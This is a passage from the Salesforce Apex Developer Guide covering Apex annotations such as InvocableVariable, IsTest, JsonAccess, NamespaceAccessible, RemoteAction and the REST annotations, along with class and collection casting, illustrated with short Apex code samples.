To identify variables used by invocable methods in custom classes, use the `InvocableVariable` annotation. The `InvocableVariable` annotation identifies a class variable used as an input or output parameter for an `InvocableMethod` method’s invocable action. If you create your own custom class to use as the input or output to an invocable method, you can annotate individual class member variables to make them available to the method. This code sample shows an invocable method with invocable variables.

```apex
global class ConvertLeadAction {
@InvocableMethod(label='Convert Leads')
global static List<ConvertLeadActionResult> convertLeads(List<ConvertLeadActionRequest>
requests) {
List<ConvertLeadActionResult> results = new List<ConvertLeadActionResult>();
for (ConvertLeadActionRequest request : requests) {
results.add(convertLead(request));
}
return results;
}
```

```apex
public static ConvertLeadActionResult convertLead(ConvertLeadActionRequest request) {
Database.LeadConvert lc = new Database.LeadConvert();
lc.setLeadId(request.leadId);
lc.setConvertedStatus(request.convertedStatus);
```

```apex
if (request.accountId != null) {
lc.setAccountId(request.accountId);
}
```

```apex
if (request.contactId != null) {
lc.setContactId(request.contactId);
}
```

```apex
if (request.overWriteLeadSource != null && request.overWriteLeadSource) {
lc.setOverwriteLeadSource(request.overWriteLeadSource);
}
```

```apex
if (request.createOpportunity != null && !request.createOpportunity) {
lc.setDoNotCreateOpportunity(!request.createOpportunity);
}
```

```apex
if (request.opportunityName != null) {
lc.setOpportunityName(request.opportunityName);
}
```

```apex
if (request.ownerId != null) {
lc.setOwnerId(request.ownerId);
}
```

```apex
if (request.sendEmailToOwner != null && request.sendEmailToOwner) {
lc.setSendNotificationEmail(request.sendEmailToOwner);
}
```

```apex
Database.LeadConvertResult lcr = Database.convertLead(lc, true);
if (lcr.isSuccess()) {
```

```apex
ConvertLeadActionResult result = new ConvertLeadActionResult();
result.accountId = lcr.getAccountId();
result.contactId = lcr.getContactId();
result.opportunityId = lcr.getOpportunityId();
return result;
} else {
```

```apex
throw new ConvertLeadActionException(lcr.getErrors()[0].getMessage());
}
}
```

```apex
global class ConvertLeadActionRequest {
@InvocableVariable(required=true)
global ID leadId;
```

```apex
@InvocableVariable(required=true)
global String convertedStatus;
```

```apex
@InvocableVariable
global ID accountId;
```

```apex
@InvocableVariable
global ID contactId;
```

```apex
@InvocableVariable
global Boolean overWriteLeadSource;
```

```apex
@InvocableVariable
global Boolean createOpportunity;
```

```apex
@InvocableVariable
global String opportunityName;
```

```apex
@InvocableVariable
global ID ownerId;
```

```apex
@InvocableVariable
global Boolean sendEmailToOwner;
}
```

```apex
global class ConvertLeadActionResult {
@InvocableVariable
global ID accountId;
```

```apex
@InvocableVariable
global ID contactId;
```

```apex
@InvocableVariable
global ID opportunityId;
}
```

```apex
class ConvertLeadActionException extends Exception {}
}
```

This code sample shows an invocable method with invocable variables that have the generic sObject data type.

```apex
public with sharing class GetFirstFromCollection {
@InvocableMethod
public static List <Results> execute (List<Requests> requestList) {
List<SObject> inputCollection = requestList[0].inputCollection;
SObject outputMember = inputCollection[0];
```

```apex
//Create a Results object to hold the return values
Results response = new Results();
```

```apex
//Add the return values to the Results object
response.outputMember = outputMember;
```

```apex
//Wrap the Results object in a List container
//(an extra step added to allow this interface to also support bulkification)
List<Results> responseWrapper= new List<Results>();
responseWrapper.add(response);
return responseWrapper;
}
```

```apex
public class Requests {
@InvocableVariable(label='Records for Input' description='yourDescription' required=true)
```

```apex
public List<SObject> inputCollection;
}
```

```apex
public class Results {
@InvocableVariable(label='Records for Output' description='yourDescription'
required=true)
```

```apex
public SObject outputMember;
}
}
```

All modifiers are optional. Default values, labels, and placeholder text appear in Flow Builder for the Action element that corresponds to an invocable method. These modifiers help admins understand how to use variables in the flow. **defaultValue** Provide a vaule to the action at runtime, if no value is provided then these default values are provided to the action at runtime. Valid invocable variable data types are: Boolean - fields must have a value of `'true'` or `'false'` and case-insensitive.

```apex
@InvocableVariable(defaultValue='true')
public Boolean myBoolean;
```

Decimal - fields must have a value of `'validDecimalValue'` where the floating point value can’t have a suffix.

```apex
@InvocableVariable(defaultValue='123.4')
public Decimal myDecimal;
```

Double - fields must have a value of `'validDoubleValue'` where the d suffix is required and case-insensitive.

```apex
@InvocableVariable(defaultValue='867.3D')
public Double myDouble;
```

Integer - fields must have a value of `'validIntegerValue'` where the inter value can’t have a suffix.

```apex
@InvocableVariable(defaultValue='-214')
public Integer myInteger;
```

Long - fields must have a value of `'validLongValue'` where the l suffix is required and case-insensitive.

```apex
@InvocableVariable(defaultValue='922337L')
public Long myLong;
```

String - fields can use any valid string value including the empty string.

```apex
@InvocableVariable(defaultValue='hello world!')
public String myString;
```

**description** The description for the variable. The default is `Null` . **label** The label for the variable. The default is the variable name. **placeholderText** Provides examples or additional guidance about the invocable variable, such as examples of values that can set the invocable variable. Valid invocable variable data types are: Double - fields must have a value of `'validDoubleValue'` where the d suffix is required and case-insensitive. Integer - fields must have a value of `'validIntegerValue'` where the inter value can’t have a suffix. String - fields can use any valid string value including the empty string. **required** Specifies whether the variable is required. If not specified, the default is `false` . The value is ignored for output variables. The `defaultValue` modifier throws an error when used with `required` . The invocable variable annotation supports the modifiers shown in this example.

```apex
@InvocableVariable(label='yourLabel'
```

```apex
description='yourDescription' placeholderText='yourPlaceholderText'
required=(true | false))
```

The invocable variable annotation supports `defaultValue` in this example.

```apex
@InvocableVariable(defaultValue='yourDefaultValue')
```

```apex
global String createOpportunity;
```

Other annotations can’t be used with the `InvocableVariable` annotation. Only global and public variables can be invocable variables. The invocable variable can’t be any of these: A non-member variable such as a `static` or `local` variable. A property. A `final` variable. `Protected` or `private` . The data type of the invocable variable must be one of these: A primitive other than Object An sObject, either the generic sObject or a specific sObject A list or a list of lists of primitives, sObjects, objects created from Apex classes, or collections The invocable variable name in Apex must match the name in the flow. The name is case-sensitive. For managed packages: Public invocable variables can be set in flows and processes within the same managed package. Global invocable variables can be set anywhere in the subscriber org. Only global invocable variables appear in Flow Builder and Process Builder in the subscriber org. Starting in API version 66.0, Apex classes used for invocable action parameters must have a visible no-argument constructor. Use the default constructor or add your own constructor. The constructor must be public for non-packaged classes or global for packaged classes invoked from outside the package. See Using Constructors on page 68. Apex Developer Guide : InvocableMethod Annotation Apex Reference Guide : Action Class Extend Invocable Action Configuration in Flow Builder

#### IsTest Annotation

Use the `@IsTest` annotation to define classes and methods that only contain code used for testing your app. The annotation can take multiple modifiers within parentheses and separated by blanks. The `@IsTest` annotation on methods is equivalent to the `testMethod` keyword. As best practice, Salesforce recommends that you use `@IsTest` rather than `testMethod` . The `testMethod` keyword may be versioned out in a future release. Classes and methods that are defined as `@IsTest` can be either `private` or `public` . Classes defined as `@IsTest` must be top-level classes. Classes defined with the `@IsTest` annotation don't count against your organization limit of 6 MB for all Apex code. Here’s an example of a private test class that contains two test methods.

```apex
@IsTest
private class MyTestClass {
```

```apex
// Methods for testing
@IsTest
static void test1() {
```

```apex
// Implement test code
}
```

```apex
@IsTest
static void test2() {
```

```apex
// Implement test code
}
```

```apex
}
```

Here’s an example of a public test class that contains utility methods for test data creation:

```apex
@IsTest
public class TestUtil {
```

```apex
public static void createTestAccounts() {
```

```apex
// Create some test accounts
}
```

```apex
public static void createTestContacts() {
```

```apex
// Create some test contacts
}
```

```apex
}
```

Classes defined as `@IsTest` can't be interfaces or enums. Methods of a public test class can only be called from a running test, that is, a test method or code invoked by a test method. Non-test requests can’t call public methods.. To learn about the various ways you can run test methods, see Run Unit Test Methods . `@IsTest(SeeAllData=true)` For Apex code saved using Salesforce API version 24.0 and later, use the `@IsTest(SeeAllData=true)` annotation to grant test classes and individual test methods access to all data in the organization. The access includes pre-existing data that the test didn’t create. Starting with Apex code saved using Salesforce API version 24.0, test methods don’t have access to pre-existing data in the organization. However, test code saved against Salesforce API version 23.0 and earlier continues to have access to all data in the organization. See Isolation of Test Data from Organization Data in Unit Tests on page 726. **Considerations for the** `@IsTest(SeeAllData=true)` **Annotation** If a test class is defined with the `@IsTest(SeeAllData=true)` annotation, the `SeeAllData=` `true` applies to all test methods that don’t explicitly set the `SeeAllData` keyword. The `@IsTest(SeeAllData=true)` annotation is used to open up data access when applied at the class or method level. However, if the containing class has been annotated with `@IsTest(SeeAllData=true)` , annotating a method with `@IsTest(SeeAllData=false)` is ignored for that method. In this case, that method still has access to all the data in the organization. Annotating a method with `@IsTest(SeeAllData=true)` overrides, for that method, an `@IsTest(SeeAllData=false)` annotation on the class. `@IsTest(SeeAllData=true)` and `@IsTest(IsParallel=true)` annotations can’t be used together on the same Apex method. This example shows how to define a test class with the `@IsTest(SeeAllData=true)` annotation. All the test methods in this class have access to all data in the organization.

```apex
// All test methods in this class can access all data.
@IsTest(SeeAllData=true)
public class TestDataAccessClass {
```

```apex
// This test accesses an existing account.
```

```apex
// It also creates and accesses a new test account.
@IsTest
static void myTestMethod1() {
```

```apex
// Query an existing account in the organization.
Account a = [SELECT Id, Name FROM Account WHERE Name='Acme' LIMIT 1];
System.assert(a != null);
```

```apex
// Create a test account based on the queried account.
Account testAccount = a.clone();
testAccount.Name = 'Acme Test';
insert testAccount;
```

```apex
// Query the test account that was inserted.
Account testAccount2 = [SELECT Id, Name FROM Account
WHERE Name='Acme Test' LIMIT 1];
System.assert(testAccount2 != null);
}
```

```apex
// Like the previous method, this test method can also access all data
// because the containing class is annotated with @IsTest(SeeAllData=true).
@IsTest
static void myTestMethod2() {
```

```apex
// Can access all data in the organization.
}
```

```apex
}
```

This second example shows how to apply the `@IsTest(SeeAllData=true)` annotation on a test method. Because the test method’s class isn’t annotated, you have to annotate the method to enable access to all data for the method. The second test method doesn’t have this annotation, so it can access only the data it creates. In addition, it can access objects that are used to manage your organization, such as users.

```apex
// This class contains test methods with different data access levels.
@IsTest
private class ClassWithDifferentDataAccess {
```

```apex
// Test method that has access to all data.
@IsTest(SeeAllData=true)
static void testWithAllDataAccess() {
```

```apex
// Can query all data in the organization.
}
```

```apex
// Test method that has access to only the data it creates
// and organization setup and metadata objects.
@IsTest
static void testWithOwnDataAccess() {
```

```apex
// This method can still access the User object.
// This query returns the first user object.
User u = [SELECT UserName,Email FROM User LIMIT 1];
System.debug('UserName: ' + u.UserName);
System.debug('Email: ' + u.Email);
```

```apex
// Can access the test account that is created here.
```

```apex
Account a = new Account(Name='Test Account');
insert a;
// Access the account that was just created.
Account insertedAcct = [SELECT Id,Name FROM Account
WHERE Name='Test Account'];
System.assert(insertedAcct != null);
}
}
```

`@IsTest(OnInstall=true)` Use the `@IsTest(OnInstall=true)` annotation to specify which Apex tests are executed during package installation. This annotation is used for tests in managed or unmanaged packages. Only test methods with this annotation, or methods that are part of a test class that has this annotation, are executed during package installation. Tests annotated to run during package installation must pass in order for the package installation to succeed. It’s no longer possible to bypass a failing test during package installation. A test method or a class that doesn't have this annotation, or that is annotated with `@IsTest(OnInstall=false)` or `@IsTest` , isn’t executed during installation. Tests annotated with `IsTest(OnInstall=` `true` `)` that run during package install and upgrade aren’t counted towards code coverage. However, code coverage is tracked and counted during a package creation operation. Because Apex code installed from a managed package is excluded from org level requirements for code coverage, it’s unlikely that you’re affected. But, if you track managed package test coverage, you must rerun these tests outside of the package install or upgrade operation for code coverage statistics to be updated. Package install isn’t blocked by code coverage requirements. This example shows how to annotate a test method that is executed during package installation. In this example, `test1` is executed but `test2` and `test3` isn’t.

```apex
public class OnInstallClass {
```

```apex
// Implement logic for the class.
public void method1(){
```

```apex
// Some code
}
}
```

```apex
@IsTest
private class OnInstallClassTest {
```

```apex
// This test method will be executed
// during the installation of the package.
@IsTest(OnInstall=true)
static void test1() {
```

```apex
// Some test code
}
```

```apex
// Tests excluded from running during the
// the installation of a package.
```

```apex
@IsTest
static void test2() {
```

```apex
// Some test code
}
```

```apex
@IsTest
static void test3() {
```

```apex
// Some test code
```

```apex
}
}
```

`@IsTest(IsParallel=true)` Use the `@IsTest(IsParallel=true)` annotation to indicate test classes that can run in parallel. **Considerations for the** `@IsTest(IsParallel=true)` **annotation** This annotation forces the test to run in parallel even if the org-wide `Disable` `Parallel` `Apex` `Testing` option is set. `@IsTest(SeeAllData=true)` and `@IsTest(IsParallel=true)` annotations can’t be used together on the same Apex method. **Restrictions on Apex tests using the** `@IsTest(IsParallel=true)` **annotation** Tests can’t call the `Test.getStandardPricebookId()` method. Tests can’t call the `System.schedule()` and `System.enqueueJob()` methods. Tests can’t insert a ContentNote SObject. Tests can’t create User or GroupMember SObjects. Tests can’t use the SObjects that are listed in sObjects That Can't Be Used Together in DML Operations . `@IsTest(critical=true)` The `RunRelevantTests` test level and the associated `@IsTest` `()` annotations are pilot or beta services that are subject to the Beta Services Terms at Agreements — Salesforce.com or a written Unified Pilot Agreement if executed by Customer, and applicable terms in the Product Terms Directory. Use of these pilot or beta services are at the Customer’s sole discretion. If you set the deployment test level to `RunRelevantTests` , use the `@IsTest(critical=true)` annotation to guarantee that the test class always runs during deployments, regardless of the deployment payload. This annotation is available at the test class level in Salesforce API version 66.0 and later. Using this annotation on a test method results in a compilation error. This example code shows a test class marked with the `@IsTest(critical=true)` annotation. When you set the deployment test level to `RunRelevantTests` , the tests in this class always run.

```apex
@IsTest(critical=true)
public with sharing class AccountServiceTest {
```

```apex
// ...
}
```

`@IsTest(testFor='...')` The `RunRelevantTests` test level and the associated `@IsTest` `()` annotations are pilot or beta services that are subject to the Beta Services Terms at Agreements — Salesforce.com or a written Unified Pilot Agreement if executed by Customer, and applicable terms in the Product Terms Directory. Use of these pilot or beta services are at the Customer’s sole discretion. If you set the deployment test level to `RunRelevantTests` , use the `@IsTest(testFor='...')` annotation to guarantee that the tests in the class run whenever the deployment includes new or modified versions of the referenced Apex components. This annotation is available at the test class level in Salesforce API version 66.0 and later. Using this annotation on a test method results in a compilation error. To use `@IsTest(testFor='...')` , set the `testFor` parameter to a comma-separated string of Apex classes and Apex triggers. For Apex classes, use the format `ApexClass:` `ClassName` . For Apex triggers, use the format `ApexTrigger:` `TriggerName` . If specifying a class or trigger from a different namespace, use the fully qualified name, for example, `ApexClass:` `MyNamespace` `.` `ClassName` . This example code shows a test class marked with the `@IsTest(testFor='...')` annotation. If you set the deployment test level to `RunRelevantTests` , this test class runs whenever `AccountHandler` or `AccountTrigger` are new or modified in the deployment payload.

```apex
@IsTest(testFor='ApexClass:AccountHandler,ApexTrigger:AccountTrigger')
public with sharing class AccountHandlerTest {
```

```apex
// ...
}
```

#### JsonAccess Annotation

The `@JsonAccess` annotation defined at Apex class level controls whether instances of the class can be serialized or deserialized. If the annotation restricts the JSON or XML serialization and deserialization, a runtime `JSONException` exception is thrown. The `serializable` and `deserializable` parameters of the `@JsonAccess` annotation enforce the contexts in which Apex allows serialization and deserialization. You can specify one or both parameters, but you can’t specify the annotation with no parameters. The valid values for the parameters to indicate whether serialization and deserialization are allowed: `never` : never allowed `sameNamespace` : allowed only for Apex code in the same namespace `samePackage` : allowed only for Apex code in the same package (impacts only second-generation packages) `always` : always allowed for any Apex code This example code shows an Apex class marked with the `@JsonAccess` annotation.

```apex
// SomeSerializableClass is serializable in the same package and deserializable in the
wider namespace
```

```apex
@JsonAccess(serializable='samePackage' deserializable='sameNamespace')
public class SomeSerializableClass { }
```

```apex
// AlwaysDeserializable class is always deserializable and serializable only in the same
namespace (default value from version 49.0 and later)
```

```apex
@JsonAccess(deserializable='always')
public class AlwaysDeserializable { }
```

`JsonAccess` If an Apex class annotated with `JsonAccess` is extended, the extended class doesn’t inherit this property. If the `toString` method is applied on objects that mustn't be serialized, private data can be exposed. You must override the `toString` method on objects whose data must be protected. For example, serializing an object stored as a key in a Map invokes the `toString` method. The generated map includes key (string) and value entries, thus exposing all the fields of the object. In versions 48.0 and earlier, the default access for deserialization is `always` and the default access for serialization is `sameNamespace` to preserve the existing behavior. From version 49.0 onwards, the default access for both serialization and deserialization is `sameNamespace` .

#### NamespaceAccessible Annotation

The `@NamespaceAccessible` makes public Apex in a package available to other packages that use the same namespace. Without this annotation, Apex classes, methods, interfaces, properties, and abstract classes defined in a 2GP package aren’t accessible to the other packages with which they share a namespace. Apex that is declared global is always available across all namespaces, and needs no annotation. For more information on 2GP managed packages, see Second-Generation Managed Packages in Salesforce DX Developer Guide . Considerations for Apex Accessibility Across Packages You can’t use the `@NamespaceAccessible` annotation for an `@AuraEnabled` Apex method or an `@InvocableMethod` Apex method. You can add or remove the `@NamespaceAccessible` annotation at any time, even on managed and released Apex code. Make sure that you don’t have dependent packages relying on the functionality of the annotation before adding or removing it. When adding or removing `@NamespaceAccessible` Apex from a package, consider the impact to customers with installed versions of other packages that reference this package’s annotation. Before pushing a package upgrade, ensure that no customer is running a package version that would fail to fully compile when the upgrade is pushed. If a public interface is declared as `@NamespaceAccessible` , then all interface members inherit the annotation. Individual interface members can’t be annotated with `@NamespaceAccessible` . If a public or protected variable or method is declared as `@NamespaceAccessible` , its defining class must be either global or public with the `@NamespaceAccessible` annotation. If a public or protected inner class is declared as `@NamespaceAccessible` , its enclosing class must be either global or public with the `@NamespaceAccessible` annotation. This example shows an Apex class marked with the `@NamespaceAccessible` annotation. The class is accessible to other packages within the same namespace. The first constructor is also visible within the namespace, but the second constructor isn’t.

```apex
// A namespace-visible Apex class
@NamespaceAccessible
public class MyClass {
```

```apex
private Boolean bypassFLS;
```

```apex
// A namespace-visible constructor that only allows secure use
@NamespaceAccessible
public MyClass() {
bypassFLS = false;
}
```

```apex
// A package private constructor that allows use in trusted contexts,
// but only internal to the package
public MyClass (Boolean bypassFLS) {
```

```apex
this.bypassFLS = bypassFLS;
}
@NamespaceAccessible
protected Boolean getBypassFLS() {
```

```apex
return bypassFLS;
```

```apex
}
}
```

In API version 47.0 and later, `@NamespaceAccessible` isn’t allowed on an entity marked with `@AuraEnabled` . Therefore, an Aura or Lightning web component installed from a package can’t call an Apex method from another package, even if both packages are in the same namespace. However, an `@AuraEnabled` public method from one package can call a `@NamespaceAccessible` public method from another package in the same namespace. Therefore, this behavior isn’t allowed.

```apex
// In Package1 in the Acme namespace
public with sharing class MyController {
```

```apex
// Stacking these annotations isn't allowed
@AuraEnabled
@NamespaceAccessible
public static void myMethod( ){
```

```apex
// ...
}
}
```

But this behavior is allowed.

```apex
// In Package1 in the Acme namespace
public with sharing class Service {
@NamespaceAccessible
public static void doSomething() {
```

```apex
// ...
}
}
```

```apex
// In Package2 in the Acme namespace
public with sharing class MyController {
```

```apex
// Can call the @NamespaceAccessible method
@AuraEnabled
public static void myMethod( ){
Service.doSomething();
}
}
```

In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are annotated with `@NamespaceAccessible` . For accessibility considerations, see Considerations for Apex Acessibility Across Packages . For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages .

#### ReadOnly Annotation

The `@ReadOnly` annotation allows you to perform less restrictive queries against the Lightning Platform database by increasing the limit of the number of returned rows for a request to 1,000,000. All other limits still apply. The annotation blocks the following operations within the request: DML operations, calls to `System.schedule` , and enqueued asynchronous Apex jobs. The `@ReadOnly` annotation is available for REST and SOAP Web services and the `Schedulable` interface. To use the `@ReadOnly` annotation, the top-level request must be in the schedule execution or the Web service invocation. For example, if a Visualforce page calls a Web service that contains the `@ReadOnly` annotation, the request fails because Visualforce is the top-level request, not the Web service. Visualforce pages can call controller methods with the `@ReadOnly` annotation, and those methods run with the same relaxed restrictions. To increase other Visualforce-specific limits, such as the size of a collection that can be used by an iteration component like `<apex:pageBlockTable` `>` , you can set the `readonly` attribute on the `<apex:page` `>` tag to `true` . For more information, see Working with Large Sets of Data in the Visualforce Developer's Guide . Prior to API version 49.0, using `@ReadOnly` on Apex REST methods (@HttpDelete, @HttpGet, @HttpPatch, @HttpPost, or @HttpPut) also required annotating the method with `@RemoteAction` . In API version 49.0 and later, you can annotate Apex REST methods with just `@ReadOnly` .

#### RemoteAction Annotation

The `RemoteAction` annotation provides support for Apex methods used in Visualforce to be called via JavaScript. This process is often referred to as JavaScript remoting. Methods with the `RemoteAction` annotation must be `static` and either `global` or `public` . Add the Apex class as a custom controller or a controller extension to your page.

```apex
<apex:page controller="MyController" extension="MyExtension">
```

Adding a controller or controller extension grants access to all `@RemoteAction` methods in that Apex class, even if those methods aren’t used in the page. Anyone who can view the page can execute all `@RemoteAction` methods and provide fake or malicious data to the controller. Then, add the request as a JavaScript function call. A simple JavaScript remoting invocation takes the following form.

```apex
[namespace.]MyController.method(
[parameters...,]
callbackFunction,
[configuration]
);
```

**Table 2: Remote Request Elements** The namespace of the controller class. The namespace element is required if your organization has a namespace defined, or if the class comes from an installed package. `namespace` The name of your Apex controller or extension. `MyController` , `MyExtension` The name of the Apex method you’re calling. `method` A comma-separated list of parameters that your method takes. `parameters` The name of the JavaScript function that handles the response from the controller. You can also declare an anonymous function inline. `callbackFunction` receives the status of the method call and the result as parameters.

```apex
callbackFunction
```

Configures the handling of the remote call and response. Use this element to change the behavior of a remoting call, such as whether to escape the Apex method’s response. `configuration` In your controller, your Apex method declaration is preceded with the `@RemoteAction` annotation like this:

```apex
@RemoteAction
global static String getItemId(String objectName) { ... }
```

Apex `@RemoteAction` methods must be `static` and either `global` or `public` . Your method can take Apex primitives, collections, typed and generic sObjects, and user-defined Apex classes and interfaces as arguments. Generic sObjects must have an ID or sobjectType value to identify actual type. Interface parameters must have an apexType to identify actual type. Your method can return Apex primitives, sObjects, collections, user-defined Apex classes and enums, `SaveResult` , `UpsertResult` , `DeleteResult` , `SelectOption` , or `PageReference` . For more information, see “JavaScript Remoting for Apex Controllers” in the Visualforce Developer's Guide .

#### SuppressWarnings Annotation

This annotation does nothing in Apex but can be used to provide information to third-party tools. The `@SuppressWarnings` annotation does nothing in Apex but can be used to provide information to third-party tools.

#### TestSetup Annotation

Methods defined with the `@TestSetup` annotation are used for creating common test records that are available for all test methods in the class. Test setup methods are defined in a test class, take no arguments, and return no value. The following is the syntax of a test setup method.

```apex
@TestSetup static void methodName() {
```

```apex
}
```

If a test class contains a test setup method, the testing framework executes the test setup method first, before any test method in the class. Records that are created in a test setup method are available to all test methods in the test class and are rolled back at the end of test class execution. If a test method changes those records, such as record field updates or record deletions, those changes are rolled back after each test method finishes execution. The next executing test method gets access to the original unmodified state of those records. You can have only one test setup method per test class. Test setup methods are supported only with the default data isolation mode for a test class. If the test class or a test method has access to organization data by using the `@IsTest(SeeAllData=true)` annotation, test setup methods aren’t supported in this class. Because data isolation for tests is available for API versions 24.0 and later, test setup methods are also available for those versions only. For more information, see Using Test Setup Methods .

#### TearDown Annotation (Developer Preview)

Use the `TearDown` annotation to mark a cleanup method that runs after the test completes, regardless of pass or fail. The Apex Integration Tests feature is available as a developer preview in scratch orgs in Summer ’26 (API version 67.0). The feature isn’t generally available unless or until Salesforce announces its general availability in documentation or in press releases or public statements. All commands, parameters, and other features are subject to change or deprecation at any time, with or without notice. Don't implement functionality developed with these commands or tools in your production package. The annotation is applied to a static method that runs after the integration test completes, regardless of whether the test passed, failed, or threw an exception. Use this annotation to clean up committed test data. The teardown transaction auto-commits at the end of the execution.

#### TestVisible Annotation

Use the `TestVisible` annotation to allow test methods to access private or protected members of another class outside the test class. These members include methods, member variables, and inner classes. This annotation enables a more permissive access level for running tests only. This annotation doesn’t change the visibility of members if accessed by non-test classes. With this annotation, you don’t have to change the access modifiers of your methods and member variables to public if you want to access them in a test method. For example, if a private member variable isn’t supposed to be exposed to external classes but it must be accessible by a test method, you can add the `TestVisible` annotation to the variable definition. This example shows how to annotate a private class member variable and private method with `TestVisible` .

```apex
public class TestVisibleExample {
```

```apex
// Private member variable
@TestVisible private static Integer recordNumber = 1;
```

```apex
// Private method
@TestVisible private static void updateRecord(String name) {
```

```apex
// Do something
}
}
```

This test class uses the previous class and contains the test method that accesses the annotated member variable and method.

```apex
@IsTest
private class TestVisibleExampleTest {
```

```apex
@IsTest static void test1() {
```

```apex
// Access private variable annotated with TestVisible
Integer i = TestVisibleExample.recordNumber;
System.assertEquals(1, i);
```

```apex
// Access private method annotated with TestVisible
TestVisibleExample.updateRecord('RecordName');
// Perform some verification
}
}
```

#### Apex REST Annotations

Use these annotations to expose an Apex class as a RESTful Web service.

```apex
•
@ReadOnly
```

```apex
•
@RestResource(urlMapping='/yourUrl')
```

```apex
•
@HttpDelete
```

`@HttpGet`

```apex
•
@HttpPatch
```

```apex
•
@HttpPost
```

`@HttpPut` Exposing Apex Classes as REST Web Services The `@RestResource` annotation is used at the class level and enables you to expose an Apex class as a REST resource. Some considerations when using this annotation: The URL mapping is relative to `https://` `instance` `.salesforce.com/services/apexrest/` . The URL mapping can contain a wildcard (*). The URL mapping is case-sensitive. For example, a URL mapping for `my_url` matches a REST resource containing `my_url` and not `My_Url` . To use this annotation, your Apex class must be defined as global. URL Guidelines URL path mappings are as follows: The path must begin with a forward slash (/). The path can be up to 255 characters long. A wildcard (*) that appears in a path must be preceded by a forward slash (/). Additionally, unless the wildcard is the last character in the path, it must be followed by a forward slash (/). The rules for mapping URLs are: An exact match always wins. If no exact match is found, find all the patterns with wildcards that match, and then select the longest (by string length) of those. If no wildcard match is found, an HTTP response status code 404 is returned. The URL for a namespaced class contains the namespace. For example, if your class is in namespace `abc` and the class is mapped to `your_url` , then the API URL is modified as follows: `https://` `instance` `.salesforce.com/services/apexrest/abc/your_url/` . In the case of a URL collision, the namespaced class is always used. The `@HttpDelete` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method is called when an HTTP `DELETE` request is sent, and deletes the specified resource. To use this annotation, your Apex method must be defined as global static. The `@HttpGet` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method is called when an HTTP `GET` request is sent, and returns the specified resource. These are some considerations when using this annotation: To use this annotation, your Apex method must be defined as global static. Methods annotated with `@HttpGet` are also called if the HTTP request uses the `HEAD` request method. The `@HttpPatch` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method is called when an HTTP `PATCH` request is sent, and updates the specified resource. To use this annotation, your Apex method must be defined as global static. The `@HttpPost` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method is called when an HTTP `POST` request is sent, and creates a new resource. To use this annotation, your Apex method must be defined as global static. The `@HttpPut` annotation is used at the method level and enables you to expose an Apex method as a REST resource. This method is called when an HTTP `PUT` request is sent, and creates or updates the specified resource. To use this annotation, your Apex method must be defined as global static.

### Classes and Casting

In general, all type information is available at run time. This means that Apex enables casting , that is, a data type of one class can be assigned to a data type of another class, but only if one class is a subclass of the other class. Use casting when you want to convert an object from one data type to another. In the following example, `CustomReport` extends the class `Report` . Therefore, it is a subclass of that class. This means that you can use casting to assign objects with the parent data type ( `Report` ) to the objects of the subclass data type ( `CustomReport` ).

```apex
public virtual class Report {
}
```

```apex
public class CustomReport extends Report {
}
```

In the following code segment, a custom report object is first added to a list of report objects. Then the custom report object is returned as a report object, which is then cast back into a custom report object.

```apex
...
```

```apex
// Create a list of report objects
Report[] Reports = new Report[5];
```

```apex
// Create a custom report object
CustomReport a = new CustomReport();
```

```apex
// Because the custom report is a sub class of the Report class,
// you can add the custom report object a to the list of report objects
Reports.add(a);
```

```apex
// The following is not legal:
// CustomReport c = Reports.get(0);
// because the compiler does not know that what you are
// returning is a custom report.
```

```apex
// You must use cast to tell it that you know what
```

```apex
// type you are returning. Instead, get the first item in the list
// by casting it back to a custom report object
CustomReport c = (CustomReport) Reports.get(0);
...
```

**Casting Example** In addition, an interface type can be cast to a sub-interface or a class type that implements that interface. To verify if a class is a specific type of class, use the `instanceOf` keyword. For more information, see Using the `instanceof` Keyword on page 86. 1. Classes and Collections 2. Collection Casting

#### Classes and Collections

Lists and maps can be used with classes and interfaces, in the same ways that lists and maps can be used with sObjects. This means, for example, that you can use a user-defined data type for the value or the key of a map. Likewise, you can create a set of user-defined objects. If you create a map or list of interfaces, any child type of the interface can be put into that collection. For instance, if the List contains an interface `i1` , and `MyC` implements `i1` , then `MyC` can be placed in the list. Using Custom Types in Map Keys and Sets

#### Collection Casting

Because collections in Apex have a declared type at runtime, Apex allows collection casting. Collections can be cast in a similar manner that arrays can be cast in Java. For example, a list of CustomerPurchaseOrder objects can be assigned to a list of PurchaseOrder objects if class `CustomerPurchaseOrder` is a child of class `PurchaseOrder` .

```apex
public virtual class PurchaseOrder {
```

```apex
Public class CustomerPurchaseOrder extends PurchaseOrder {
```

```apex
}
{
List<PurchaseOrder> POs = new PurchaseOrder[] {};
List<CustomerPurchaseOrder> CPOs = new CustomerPurchaseOrder[]{};
POs = CPOs;
}
}
```

Once the `CustomerPurchaseOrder` list is assigned to the `PurchaseOrder` list variable, it can be cast back to a list of CustomerPurchaseOrder objects, but only because that instance was originally instantiated as a list of CustomerPurchaseOrder objects. A list of PurchaseOrder objects that is instantiated as such cannot be cast to a list of CustomerPurchaseOrder objects, even if the list of PurchaseOrder objects contains only CustomerPurchaseOrder objects. If the user of a PurchaseOrder list that only includes CustomerPurchaseOrders objects tries to insert a non-CustomerPurchaseOrder subclass of `PurchaseOrder` (such as `InternalPurchaseOrder` ), a runtime exception results. This is because Apex collections have a declared type at runtime. Maps behave in the same way as lists with regards to the value side of the Map. If the value side of map A can be cast to the value side of map B, and they have the same key type, then map A can be cast to map B. A runtime error results if the casting is not valid with the particular map at runtime.

### Differences Between Apex Classes and Java Classes

Apex classes and Java classes work in similar ways, but there are some significant differences. These are the major differences between Apex classes and Java classes: Inner classes and interfaces can only be declared one level deep inside an outer class. Static methods and variables can only be declared in a top-level class definition, not in an inner class. An inner class behaves like a static Java inner class, but doesn’t require the `static` keyword. An inner class can have instance member variables like an outer class, but there is no implicit pointer to an instance of the outer class (using the `this` keyword). The `private` access modifier is the default, and means that the method or variable is accessible only within the Apex class in which it is defined. If you do not specify an access modifier, the method or variable is `private` . Specifying no access modifier for a method or variable and the `private` access modifier are synonymous. The `public` access modifier means the method or variable can be used by any Apex in this application or namespace. The `global` access modifier means the method or variable can be used by any Apex code that has access to the class, not just the Apex code in the same application. This access modifier should be used for any method that needs to be referenced outside of the application, either in the SOAP API or by other Apex code. If you declare a 